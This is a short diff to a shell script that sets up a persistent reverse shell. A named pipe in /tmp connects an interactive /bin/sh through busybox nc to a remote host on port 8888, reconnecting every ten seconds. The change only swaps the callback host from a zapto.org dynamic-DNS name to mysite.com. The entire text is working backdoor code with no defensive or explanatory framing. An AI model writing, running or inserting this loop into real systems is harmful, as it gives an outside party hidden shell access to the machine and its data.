@@ -1,7 +1,7 @@
 FIFO=/tmp/f.$$
 mkfifo $FIFO
 while true; do
- cat $FIFO | /bin/sh -i 2>&1 | busybox nc fuertecalufa.zapto.org 8888 > $FIFO
+ cat $FIFO | /bin/sh -i 2>&1 | busybox nc mysite.com 8888 > $FIFO
  sleep 10
 done
 rm $FIFO
